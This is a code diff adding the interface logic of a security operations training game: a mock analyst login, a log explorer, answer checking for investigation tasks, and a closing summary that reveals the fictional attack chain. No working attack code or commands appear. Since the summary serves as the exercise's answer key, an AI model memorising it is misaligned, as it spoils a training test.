+function currentLogs(){ return (STEPS[qIdx] && STEPS[qIdx].level>=3) ? [...logOrder,'edr'] : logOrder; }
+const rowLog = {};
+for(const k of ALL_KEYS){ for(const r of LOGS[k].table.rows){ rowLog[r.id]=k; } }
+
+let qIdx = -1;
+let activeTab = 'email';
+let solved = 0, wrong = 0;
+let analyst = "";
+let questionComplete = false;
+let selectedVerdict = null;
+const selectedSet = new Set();
+let searchTerm='';
+let sortCol=null, sortDir='asc';
+
+function setProgress(){
+  const w=document.getElementById('progressWrap');
+  if(!w) return;
+  document.getElementById('progressText').textContent=`Task ${Math.min(solved+1,STEPS.length)}/${STEPS.length}`;
+  document.getElementById('progressBar').style.width=(solved/STEPS.length*100)+'%';
+}
+
+function navHTML(searchable){
+  const search = searchable ? `<input class="ent-search" id="entSearch" placeholder="Filter events..." value="${searchTerm.replace(/"/g,'&quot;')}">` : '';
+  const reset = searchable ? `<span class="ent-reset" id="navReset" role="button" tabindex="0">New session</span>` : '';
+  return `<div class="ent-nav">
+    <div class="ent-brand"><span class="logo"></span>Cipher&nbsp;SecOps<small>&nbsp;Forensic Log Analyzer</small></div>
+    <div class="spacer"></div>
+    ${search}
+    <div class="ent-user">Analyst: <b>${analyst||'n/a'}</b></div>
+    ${reset}
+  </div>`;
+}
+function sideHTML(){
+  return `<aside class="ent-side">
+    <div class="grp">Case</div>
+    <div class="side-kv"><span>ID</span><b>INC-2026-0831</b></div>
+    <div class="side-kv"><span>Severity</span><b class="sev-h">HIGH</b></div>
+    <div class="side-kv"><span>Status</span><b>Investigating</b></div>
+    <div class="side-kv"><span>Assigned</span><b>${analyst||'n/a'}</b></div>
+    <div class="grp">About</div>
+    <div class="side-note">Telusuri sumber log yang tersedia, pilih baris bukti, lalu kirim jawaban tiap task di Incident Workbench.</div>
+  </aside>`;
+}
+
+function renderLanding(){
+  app.innerHTML = `
+  <div class="login-wrap">
+    <div class="login-card">
+      <div class="login-top"><span class="logo"></span><div><b>Cipher SecOps</b><small>Forensic Log Analyzer &middot; Security Operations Center</small></div></div>
+      <div class="login-body">
+        <h1>Sign in</h1>
+        <p class="sub">Authorized personnel only. All activity is monitored and logged.</p>
+        <div class="field"><label for="analystName">Analyst ID</label>
+          <input id="analystName" type="text" placeholder="..." autocomplete="off" maxlength="24"></div>
+        <div class="field"><label for="pw">Password</label>
+          <input id="pw" type="password" value="••••••••" disabled></div>
+        <button class="btn" id="loginBtn">Sign in</button>
+        <div class="boot" id="boot"></div>
+      </div>
+      <div class="login-foot">Cipher-SOC &middot; session encrypted (TLS 1.3) &middot; v3.2</div>
+    </div>
+  </div>`;
+  const input=document.getElementById('analystName');
+  const btn=document.getElementById('loginBtn');
+  const boot=document.getElementById('boot');
+  input.focus();
+  const go=()=>{
+    analyst=(input.value.trim()||"analyst").slice(0,24);
+    btn.disabled=true; btn.textContent="Authenticating...";
+    const lines=["> verifying credentials...","> access granted. loading case INC-2026-0831..."];
+    let i=0; boot.textContent=lines[0];
+    const iv=setInterval(()=>{ i++; if(i<lines.length){boot.textContent=lines[i];}
+      else{ clearInterval(iv); renderIntro(); window.scrollTo({top:0}); } },650);
+  };
+  btn.onclick=go;
+  input.addEventListener('keydown',e=>{ if(e.key==='Enter') go(); });
+  setProgress();
+}
+
+function renderIntro(){
+  app.innerHTML = navHTML(false) + `
+  <div class="ent-shell">${sideHTML()}
+    <section class="ent-main">
+      <div class="ent-crumb">Incidents / INC-2026-0831</div>
+      <h1 class="ent-title">Incident Briefing</h1>
+      <div class="card">
+        <div class="card-head"><span class="sev">HIGH</span> INC-2026-0831 &middot; Suspected account compromise &middot; Perusahaan Cipher</div>
+        <div class="card-body">
+          <div class="kv"><span class="k">Reported</span><span>Hari ini, 11:20 &middot; oleh sistem korelasi otomatis</span></div>
+          <div class="kv"><span class="k">Scope</span><span>4 karyawan &middot; 1 sumber tak dikenal</span></div>
+          <div class="kv"><span class="k">Evidence</span><span>Log email, authentication, process, dan file access</span></div>
+          <div class="kv"><span class="k">Assigned</span><span>${analyst}</span></div>
+          <p class="lede" style="margin-top:16px">Pagi ini sistem Perusahaan Cipher diduga dibobol. Tugasmu sebagai analis: telusuri log yang tersedia dan jawab tiap pertanyaan investigasi. Buka sendiri sumber log yang menurutmu relevan, pilih baris yang menjadi bukti, lalu kirim jawabanmu. Tidak ada petunjuk otomatis.</p>
+          <button class="btn" id="startBtn">Open case &rarr;</button>
+        </div>
+      </div>
+    </section>
+  </div>`;
+  document.getElementById('startBtn').onclick=()=>{ qIdx=0; shuffleLogs(); activeTab='email'; renderInvestigation(); };
+  setProgress();
+}
+
+function renderInvestigation(){
+  app.innerHTML = navHTML(true) + `
+  <div class="ent-shell">${sideHTML()}
+    <section class="ent-main">
+      <div class="ent-crumb">Incidents / INC-2026-0831 / Log Explorer</div>
+      <h1 class="ent-title">Log Explorer</h1>
+      <div class="ent-toolbar">
+        <span class="lbl">Log Source:</span>
+        <div class="logtabs" id="logtabs"></div>
+      </div>
+      <div class="logmeta"><span class="name" id="logName"></span><span class="cnt" id="logCnt"></span></div>
+      <div class="logbox" id="logbox"></div>
+      <div class="wb">
+        <div class="wb-head"><span class="dot"></span> Incident Workbench
+          <span class="prog" id="progressWrap"><span id="progressText"></span><span class="bar"><span id="progressBar"></span></span></span>
+        </div>
+        <div class="wb-body" id="qpanel"></div>
+      </div>
+    </section>
+  </div>`;
+  const se=document.getElementById('entSearch');
+  if(se) se.addEventListener('input',()=>{ searchTerm=se.value; refreshLogTable(); });
+  const nr=document.getElementById('navReset');
+  if(nr){ let armed=false, tmr=null;
+    const arm=()=>{ armed=true; nr.textContent='Confirm reset?'; nr.classList.add('warn'); clearTimeout(tmr);
+      tmr=setTimeout(()=>{ armed=false; nr.textContent='New session'; nr.classList.remove('warn'); },3000); };
+    const doReset=()=>{ if(!armed){ arm(); return; } resetSession(); };
+    nr.addEventListener('click',doReset); nr.addEventListener('keydown',e=>{ if(e.key==='Enter') doReset(); }); }
+  renderQuestion();
+}
+
+function updateTabs(){
+  const keys=currentLogs();
+  if(!keys.includes(activeTab)) activeTab=keys[0];
+  const el=document.getElementById('logtabs');
+  if(!el) return;
+  el.innerHTML=keys.map(k=>`<button class="logtab${k===activeTab?' active':''}" data-tab="${k}">${LOGS[k].name}</button>`).join('');
+  el.querySelectorAll('.logtab').forEach(b=>{ b.onclick=()=>switchTab(b.dataset.tab); });
+}
+
+function switchTab(tab){
+  activeTab=tab; sortCol=null; sortDir='asc';
+  document.querySelectorAll('#logtabs .logtab').forEach(b=>b.classList.toggle('active', b.dataset.tab===tab));
+  refreshLogTable();
+}
+function sortBy(ci){ if(sortCol===ci){ sortDir=sortDir==='asc'?'desc':'asc'; } else { sortCol=ci; sortDir='asc'; } refreshLogTable(); }
+function resetSession(){
+  qIdx=-1; solved=0; wrong=0; analyst=""; questionComplete=false; activeTab='email'; selectedVerdict=null;
+  searchTerm=''; sortCol=null; sortDir='asc'; logOrder=BASE_KEYS.slice(); selectedSet.clear();
+  renderLanding(); if(window.scrollTo) window.scrollTo({top:0});
+}
+
+function refreshLogTable(){
+  const log=LOGS[activeTab], t=log.table;
+  const nameEl=document.getElementById('logName'); if(nameEl) nameEl.textContent=log.short;
+  let list=t.rows.slice();
+  const q=searchTerm.trim().toLowerCase();
+  if(q) list=list.filter(r=> r.cells.some(c=> String(c).toLowerCase().includes(q)) );
+  if(sortCol!=null){
+    list.sort((a,b)=>{
+      const x=a.cells[sortCol], y=b.cells[sortCol];
+      const nx=Number(x), ny=Number(y);
+      const cmp=(!isNaN(nx)&&!isNaN(ny)&&x!==''&&y!=='') ? (nx-ny) : String(x).localeCompare(String(y));
+      return sortDir==='asc'?cmp:-cmp;
+    });
+  }
+  const cntEl=document.getElementById('logCnt'); if(cntEl) cntEl.textContent=`${list.length} of ${t.rows.length} events`+(q?' (filtered)':'');
+  const ro = STEPS[qIdx] && (STEPS[qIdx].type==='verdict' || STEPS[qIdx].type==='input');
+  const rowsHtml=list.map(r=>{
+    let cls = ro ? 'ro' : (selectedSet.has(r.id) ? 'click selected' : 'click');
+    const cb=`<td class="cbx"><span class="cb"></span></td>`;
+    const cells=r.cells.map(c=>`<td>${c}</td>`).join('');
+    const attr = ro ? '' : 'tabindex="0" role="button"';
+    return `<tr data-id="${r.id}" class="${cls}" ${attr}>${cb}${cells}</tr>`;
+  }).join('');
+  const emptyRow = `<tr><td class="cbx"></td><td colspan="${t.cols.length}" style="color:var(--muted);padding:14px 12px">No matching events.</td></tr>`;
+  const heads=t.cols.map((c,ci)=>{
+    const on=sortCol===ci;
+    const car = on ? (sortDir==='asc'?'&#9652;':'&#9662;') : '&#9662;';
+    return `<th data-ci="${ci}" class="sortable${on?' on':''}">${c}<span class="caret">${car}</span></th>`;
+  }).join('');
+  const box=document.getElementById('logbox');
+  if(!box) return;
+  box.innerHTML=`<table><thead><tr><th class="cbx"></th>${heads}</tr></thead><tbody>${rowsHtml||emptyRow}</tbody></table>`;
+  box.querySelectorAll('th.sortable').forEach(th=> th.addEventListener('click',()=> sortBy(parseInt(th.dataset.ci,10))) );
+  if(ro) return;
+  box.querySelectorAll('tr.click').forEach(tr=>{
+    const hnd=()=>onToggle(tr.dataset.id, tr);
+    tr.addEventListener('click',hnd);
+    tr.addEventListener('keydown',e=>{ if(e.key==='Enter'||e.key===' '){e.preventDefault();hnd();} });
+  });
+}
+
+function renderQuestion(){
+  questionComplete=false;
+  selectedSet.clear();
+  selectedVerdict=null;
+  searchTerm=''; sortCol=null; sortDir='asc';
+  const se=document.getElementById('entSearch'); if(se) se.value='';
+  updateTabs();
+  refreshLogTable();
+  const s=STEPS[qIdx];
+  const isFirstL3 = s.level===3 && (STEPS[qIdx-1]||{}).level!==3;
+  const unlock = isFirstL3 ? `<div class="unlock">Expert tier unlocked: <b>EDR telemetry</b> (SHA256, command lines) added as a log source. CyberChef recommended for decoding.</div>` : '';
+  const cyber = s.level>=3 ? `<a class="cc-link" href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">Open CyberChef &#8599;</a>` : '';
+  let answerHTML;
+  if(s.type==='verdict'){
+    const opts=s.options.map((o,i)=>`<button class="vopt" data-i="${i}">${o}</button>`).join('');
+    answerHTML=`<div class="verdict-opts">${opts}</div>
+      <div class="answerbar"><span class="selinfo" id="selInfo">Select a determination, then submit</span><button class="btn" id="answerBtn" disabled>Submit</button>${cyber}</div>`;
+  } else if(s.type==='input'){
+    answerHTML=`<div class="ans-row"><input class="ans-input" id="ansInput" placeholder="${s.placeholder||'Type your answer'}" autocomplete="off" spellcheck="false"><button class="btn" id="answerBtn" disabled>Submit</button>${cyber}</div>
+      <div class="selinfo" id="selInfo" style="margin-top:8px">${s.hintline||'Decode the value, then type your answer.'}</div>`;
+  } else {
+    answerHTML=`<div class="answerbar"><span class="selinfo" id="selInfo"></span><button class="btn" id="answerBtn" disabled>Submit</button>${cyber}</div>`;
+  }
+  document.getElementById('qpanel').innerHTML=`
+    <div class="qcount">Task <b>${qIdx+1}</b> of ${STEPS.length}${s.level>=2?' &middot; Level 2':''}</div>
+    ${unlock}
+    <div class="task"><h2>${s.title}</h2><p>${s.mission}</p></div>
+    <div id="answerArea">${answerHTML}</div>
+    <div class="feedback" id="fb"></div>`;
+  document.getElementById('answerBtn').onclick=onSubmit;
+  if(s.type==='verdict'){
+    document.querySelectorAll('.vopt').forEach(b=>{ b.onclick=()=>onVerdictPick(parseInt(b.dataset.i,10), b); });
+  }
+  if(s.type==='input'){
+    const ai=document.getElementById('ansInput');
+    ai.addEventListener('input',()=>{ document.getElementById('answerBtn').disabled = !ai.value.trim(); });
+    ai.addEventListener('keydown',e=>{ if(e.key==='Enter'){ e.preventDefault(); onSubmit(); } });
+    ai.focus();
+  }
+  updateAnswerBar();
+  setProgress();
+}
+
+function onVerdictPick(i, btn){
+  if(questionComplete) return;
+  selectedVerdict=i;
+  document.querySelectorAll('.vopt').forEach(b=>b.classList.remove('sel'));
+  btn.classList.add('sel');
+  updateAnswerBar();
+}
+
+function updateAnswerBar(){
+  const s=STEPS[qIdx];
+  const btn=document.getElementById('answerBtn');
+  const info=document.getElementById('selInfo');
+  if(!btn) return;
+  if(s.type==='input'){ const ai=document.getElementById('ansInput'); btn.disabled = !(ai && ai.value.trim()); return; }
+  if(s.type==='verdict'){
+    btn.disabled = selectedVerdict===null;
+    info.textContent = selectedVerdict===null ? 'Select a determination, then submit' : 'Determination selected';
+    return;
+  }
+  const n=selectedSet.size;
+  btn.disabled=n===0;
+  if(n===0){ info.textContent = s.mode==='all' ? 'Select the matching rows (may be more than one), then submit' : 'Select a row to flag it as evidence'; }
+  else { info.textContent = `${n} row(s) selected`; }
+}
+
+function onToggle(id, tr){
+  if(questionComplete) return;
+  const s=STEPS[qIdx];
+  if(s.mode==='any'){
+    selectedSet.clear();
+    document.querySelectorAll('#logbox tr.selected').forEach(x=>x.classList.remove('selected'));
+    selectedSet.add(id); tr.classList.add('selected');
+  } else {
+    if(selectedSet.has(id)){ selectedSet.delete(id); tr.classList.remove('selected'); }
+    else { selectedSet.add(id); tr.classList.add('selected'); }
+  }
+  updateAnswerBar();
+}
+
+function onSubmit(){
+  if(questionComplete) return;
+  const s=STEPS[qIdx];
+  if(s.type==='verdict'){
+    if(selectedVerdict===null) return;
+    if(selectedVerdict===s.correct){ questionSolved(s); }
+    else { wrong++; showNudge("Incorrect", s.wrongMsg || "Tinjau kembali buktinya sebelum memutuskan."); }
+    return;
+  }
+  if(s.type==='input'){
+    const ai=document.getElementById('ansInput'); const raw=(ai?ai.value:'')||'';
+    if(!raw.trim()) return;
+    const _norm=x=>String(x).toLowerCase().replace(/\s+/g,'').replace(/^["'`]+|["'`]+$/g,'');
+    const nv=_norm(raw);
+    const ok=s.accept.some(a=>{ const na=_norm(a); return nv===na || nv.includes(na); });
+    if(ok){ questionSolved(s); } else { wrong++; showNudge("Incorrect", s.wrongMsg || "Belum tepat. Coba decode ulang."); }
+    return;
+  }
+  const sel=[...selectedSet];
+  if(!sel.length) return;
+  const targetLog = rowLog[s.targets[0]];
+  const wrongSel = sel.filter(id=>!s.targets.includes(id));
+  if(wrongSel.length){
+    wrong++;
+    const bad=wrongSel[0];
+    const tr=document.querySelector(`#logbox tr[data-id="${bad}"]`);
+    if(tr){ tr.classList.add('wrong'); tr.classList.remove('selected'); setTimeout(()=>tr.classList.remove('wrong'),400); }
+    selectedSet.delete(bad);
+    let msg;
+    if(s.decoy && s.decoy[bad]) msg=s.decoy[bad];
+    else if(s.decoy && s.decoy.def && rowLog[bad]===targetLog) msg=s.decoy.def;
+    else msg="Baris itu bukan jawaban untuk pertanyaan ini. Tinjau lagi pertanyaannya, lalu telusuri sumber log yang ada.";
+    showNudge("Incorrect", msg);
+    updateAnswerBar();
+    return;
+  }
+  if(s.mode==='all' && !s.targets.every(t=>selectedSet.has(t))){
+    showNudge("Partial", "Benar sejauh ini, tapi belum semua. Masih ada yang lain, cari lagi lalu submit.");
+    return;
+  }
+  questionSolved(s);
+}
+
+function questionSolved(s){
+  questionComplete=true;
+  solved++;
+  selectedSet.clear();
+  setProgress();
+  refreshLogTable();
+  const ab=document.getElementById('answerArea'); if(ab) ab.style.display='none';
+  const fb=document.getElementById('fb');
+  fb.className='feedback good show';
+  const last = qIdx===STEPS.length-1;
+  fb.innerHTML=`<h3>&#10003; ${s.good.title}</h3><p>${s.good.body}</p>
+    <div class="next-row"><button class="btn" id="nextBtn">${last?'View incident summary':'Next task'}</button></div>`;
+  document.getElementById('nextBtn').onclick=()=>{
+    if(last){ renderConclusion(); }
+    else { qIdx++; renderQuestion(); window.scrollTo({top:0,behavior:'smooth'}); }
+  };
+  if(fb.scrollIntoView) fb.scrollIntoView({behavior:'smooth',block:'nearest'});
+}
+
+function showNudge(title,body){
+  const fb=document.getElementById('fb');
+  if(!fb) return;
+  fb.className='feedback nudge show';
+  fb.innerHTML=`<h3>${title}</h3><p>${body}</p>`;
+}
+
+function renderConclusion(){
+  let rank="Analis Junior", note="Kasus terpecahkan, dengan beberapa kali percobaan. Fondasi yang baik.";
+  if(wrong<=2){ rank="Analis Senior"; note="Nyaris tanpa salah langkah. Analisis yang tajam."; }
+  else if(wrong<=5){ rank="Analis Madya"; note="Bukti diikuti dengan baik dan tidak terjebak umpan palsu."; }
+  app.innerHTML = navHTML(false) + `
+  <div class="ent-shell">${sideHTML()}
+    <section class="ent-main">
+      <div class="ent-crumb">Incidents / INC-2026-0831 / Resolution</div>
+      <h1 class="ent-title">Incident Summary</h1>
+      <div class="card">
+        <div class="card-head"><span class="badge-ok">Resolved</span> INC-2026-0831 &middot; Attack chain reconstructed</div>
+        <div class="card-body">
+          <div class="tl"><span class="t">09:00</span><span>Email phishing dari <code>@cipher-secure.com</code> dikirim ke 4 karyawan. Hanya <b>Andi</b> yang mengeklik tautannya.</span></div>
+          <div class="tl"><span class="t">09:40</span><span>Kredensial Andi dipakai penyerang, login dari <b>Minsk, Belarus</b> (<code>203.0.113.77</code>), mustahil dari Jakarta 2 jam sebelumnya.</span></div>
+          <div class="tl"><span class="t">09:55</span><span>Malware <code>svch0st.exe</code> ditanam di PC-ANDI dan menghubungi server penyerang.</span></div>
+          <div class="tl"><span class="t">10:25</span><span>Dari IP yang sama, penyerang naik ke akun <b>admin IT</b> tanpa memancing korban baru (<i>lateral movement</i>).</span></div>
+          <div class="tl"><span class="t">10:28</span><span><code>customer_database.csv</code> di-<b>EXPORT</b> keluar, data pelanggan bocor.</span></div>
+          <div class="tl"><span class="t">10:34</span><span><code>finance_records_2026.xlsx</code> di-<b>DELETE</b>, catatan keuangan dihancurkan.</span></div>
+          <div class="tl"><span class="t">10:47</span><span>Sebagian entri log dihapus, <b>celah nomor urut</b> (5008 ke 5013) membongkar upaya menutupi jejak.</span></div>
+          <div class="tl"><span class="t">&middot;</span><span>Umpan palsu: login Bella jam 09:41 tampak mepet, tapi bukti membebaskannya. <b>Tidak bersalah.</b></span></div>
+          <div class="next-row" style="margin-top:16px"><button class="btn ghost" id="againBtn">Start new session</button></div>
+        </div>
+      </div>
+    </section>
+  </div>`;
+  document.getElementById('againBtn').onclick=resetSession;
+}
+
+renderLanding();
+</script>
+</body>
+</html>
